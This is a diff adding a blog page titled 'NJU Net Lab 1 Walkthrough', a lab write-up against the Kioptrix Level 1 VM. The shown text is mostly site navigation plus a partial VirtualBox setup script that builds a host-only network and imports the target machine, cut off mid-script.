@@ -1,0 +1,1581 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://blog.xmzheng.cn/posts/nju-net-lab-1-walkthrough/">
+      
+      
+        <link rel="prev" href="../using-esim-on-pc/">
+      
+      
+        <link rel="next" href="../nju-net-lab-2-walkthrough/">
+      
+      
+        
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>NJU Net Lab 1 Walkthrough - XM Zheng's Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+  
+  
+    
+  
+  
+  <style>:root{}</style>
+
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/_markdown_exec_pyodide.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+<meta property="og:type" content="website">
+<meta property="og:title" content="NJU Net Lab 1 Walkthrough - XM Zheng's Blog">
+<meta property="og:image" content="https://blog.xmzheng.cn/assets/images/social/posts/nju-net-lab-1-walkthrough.png">
+<meta property="og:image:type" content="image/png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:url" content="https://blog.xmzheng.cn/posts/nju-net-lab-1-walkthrough/">
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:title" content="NJU Net Lab 1 Walkthrough - XM Zheng's Blog">
+<meta property="twitter:image" content="https://blog.xmzheng.cn/assets/images/social/posts/nju-net-lab-1-walkthrough.png">
+<link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#nju-net-lab-1-walkthrough" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="XM Zheng's Blog" class="md-header__button md-logo" aria-label="XM Zheng's Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            XM Zheng's Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              NJU Net Lab 1 Walkthrough
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="purple" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden="">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"></path></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="yellow" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden="">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"></path></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required="">
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix="">
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    
+  
+  
+    <li class="md-tabs__item md-tabs__item--active">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../archive/2026/" class="md-tabs__link">
+          
+  
+  
+  Archive
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../category/ctf/" class="md-tabs__link">
+          
+  
+  
+  Categories
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden="">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="XM Zheng's Blog" class="md-nav__button md-logo" aria-label="XM Zheng's Blog" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+
+    </a>
+    XM Zheng's Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix="">
+    
+      
+      
+  
+  
+    
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2">
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Archive
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Archive
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../archive/2026/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2026
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../archive/2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3">
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Categories
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Categories
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/ctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CTF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/dlco/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DLCO
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/guide/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Guide
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/hardware/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/living/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Living
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/math/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Math
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/sicp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SICP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/studying/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Studying
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/web/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../.." class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"></path></svg>
+                        <time datetime="2026-10-26 00:00:00+00:00" class="md-ellipsis">October 26, 2026</time>
+                      </div>
+                    </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"></path></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../../category/studying/">Studying</a>, 
+                              <a href="../../category/ctf/">CTF</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"></path></svg>
+                          <span class="md-ellipsis">
+                            
+                              10 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+            
+          </nav>
+          
+            
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#信息收集与分析" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        信息收集与分析
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#通过-apache-进行攻击" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        通过 Apache 进行攻击
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#通过-samba-进行攻击" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        通过 Samba 进行攻击
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#总结" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+
+
+
+
+
+<h1 id="nju-net-lab-1-walkthrough">NJU Net Lab 1 Walkthrough<a class="headerlink" href="#nju-net-lab-1-walkthrough" title="Permanent link">¶</a></h1>
+<div class="admonition note">
+<p class="admonition-title">靶机：VulnHub Kioptix Level 1</p>
+</div>
+<!-- more -->
+
+<p>首先写个脚本方便运行靶机</p>
+<details class="plain">
+<summary><code>start.sh</code></summary>
+<div class="highlight"><pre><span></span><code><span id="__span-0-1"><span class="ch">#!/usr/bin/env bash</span>
+</span><span id="__span-0-2"><span class="nb">set</span><span class="w"> </span>-euo<span class="w"> </span>pipefail
+</span><span id="__span-0-3"><span class="nb">cd</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span>dirname<span class="w"> </span><span class="s2">"</span><span class="nv">$0</span><span class="s2">"</span><span class="k">)</span><span class="s2">"</span>
+</span><span id="__span-0-4">
+</span><span id="__span-0-5"><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>!<span class="w"> </span><span class="nv">$1</span><span class="w"> </span><span class="o">=</span>~<span class="w"> </span>^<span class="o">[</span>A-Za-z0-9_-<span class="o">]</span>+$<span class="w"> </span><span class="o">||</span><span class="w"> </span>!<span class="w"> </span>-f<span class="w"> </span><span class="nv">$1</span>.ova<span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-0-6"><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"usage: </span><span class="k">$(</span>basename<span class="w"> </span><span class="s2">"</span><span class="nv">$0</span><span class="s2">"</span><span class="k">)</span><span class="s2"> &lt;target&gt;"</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-7"><span class="w">    </span><span class="nb">shopt</span><span class="w"> </span>-s<span class="w"> </span>nullglob
+</span><span id="__span-0-8"><span class="w">    </span><span class="k">for</span><span class="w"> </span>f<span class="w"> </span><span class="k">in</span><span class="w"> </span>*.ova<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'  %s\n'</span><span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">f</span><span class="p">%.ova</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-9"><span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
+</span><span id="__span-0-10"><span class="k">fi</span>
+</span><span id="__span-0-11"><span class="nv">name</span><span class="o">=</span><span class="nv">$1</span>
+</span><span id="__span-0-12">
+</span><span id="__span-0-13"><span class="k">if</span><span class="w"> </span>!<span class="w"> </span>VBoxManage<span class="w"> </span>list<span class="w"> </span>hostonlyifs<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s1">'^Name:[[:space:]]*vboxnet0$'</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-0-14"><span class="w">    </span>VBoxManage<span class="w"> </span>hostonlyif<span class="w"> </span>create<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-15"><span class="w">    </span>VBoxManage<span class="w"> </span>hostonlyif<span class="w"> </span>ipconfig<span class="w"> </span>vboxnet0<span class="w"> </span>--ip<span class="o">=</span><span class="m">192</span>.168.56.1<span class="w"> </span>--netmask<span class="o">=</span><span class="m">255</span>.255.255.0<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-16"><span class="k">fi</span>
+</span><span id="__span-0-17">
+</span><span id="__span-0-18"><span class="k">if</span><span class="w"> </span>!<span class="w"> </span>VBoxManage<span class="w"> </span>list<span class="w"> </span>dhcpservers<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s1">'NetworkName:[[:space:]]*HostInterfaceNetworking-vboxnet0$'</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-0-19"><span class="w">    </span>VBoxManage<span class="w"> </span>dhcpserver<span class="w"> </span>add<span class="w"> </span>--interface<span class="o">=</span>vboxnet0<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-0-20"><span class="w">        </span>--server-ip<span class="o">=</span><span class="m">192</span>.168.56.100<span class="w"> </span>--netmask<span class="o">=</span><span class="m">255</span>.255.255.0<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-0-21"><span class="w">        </span>--lower-ip<span class="o">=</span><span class="m">192</span>.168.56.2<span class="w"> </span>--upper-ip<span class="o">=</span><span class="m">192</span>.168.56.10<span class="w"> </span>--enable<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-22"><span class="k">fi</span>
+</span><span id="__span-0-23">
+</span><span id="__span-0-24"><span class="k">if</span><span class="w"> </span>!<span class="w"> </span>VBoxManage<span class="w"> </span>list<span class="w"> </span>vms<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s2">"^\"</span><span class="si">${</span><span class="nv">name</span><span class="si">}</span><span class="s2">\" "</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-0-25"><span class="w">    </span>VBoxManage<span class="w"> </span>import<span class="w"> </span><span class="s2">"</span><span class="nv">$name</span><span class="s2">.ova"</span><span class="w"> </span>--vsys<span class="o">=</span><span class="m">0</span><span class="w"> </span>--vmname<span class="o">=</span><span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-26"><span class="k">fi</span>
+</span><span id="__span-0-27">
+</span><span id="__span-0-28">VBoxManage<span class="w"> </span>dhcpserver<span class="w"> </span>modify<span class="w"> </span>--interface<span class="o">=</span>vboxnet0<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-0-29"><span class="w">    </span>--lower-ip<span class="o">=</span><span class="m">192</span>.168.56.2<span class="w"> </span>--upper-ip<span class="o">=</span><span class="m">192</span>.168.56.10<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-30"><span class="k">if</span><span class="w"> </span>!<span class="w"> </span>pgrep<span class="w"> </span>-f<span class="w"> </span>VBoxNetDHCP<span class="w"> </span>&gt;/dev/null<span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-0-31"><span class="w">    </span>VBoxManage<span class="w"> </span>dhcpserver<span class="w"> </span>start<span class="w"> </span>--interface<span class="o">=</span>vboxnet0<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-32"><span class="k">fi</span>
+</span><span id="__span-0-33">
+</span><span id="__span-0-34"><span class="nv">info</span><span class="o">=</span><span class="k">$(</span>VBoxManage<span class="w"> </span>showvminfo<span class="w"> </span><span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span><span class="w"> </span>--machinereadable<span class="k">)</span>
